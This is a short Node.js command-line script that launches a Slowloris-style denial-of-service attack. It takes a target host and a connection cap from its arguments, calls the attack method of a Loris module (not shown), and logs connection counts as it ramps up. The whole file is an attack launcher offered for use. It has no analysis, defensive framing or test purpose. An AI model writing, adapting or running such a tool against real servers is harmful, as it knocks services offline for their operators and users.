#!/usr/bin/env node

const Cli = require('cli.util'),
	Loris = require('./loris.js');

let cli = new Cli(process.argv, {
	max: ['n', 'm']
});

let l = new Loris(cli.get('host'), Number(cli.get('max') || 20000))
	.attack();

l.on('ramp', (r) => {
	console.log('ramp up connection', r);
});

setInterval(() => {
	console.log('connections', l.connections, '/', l.pool, 'max', l.cap);
}, 1000);
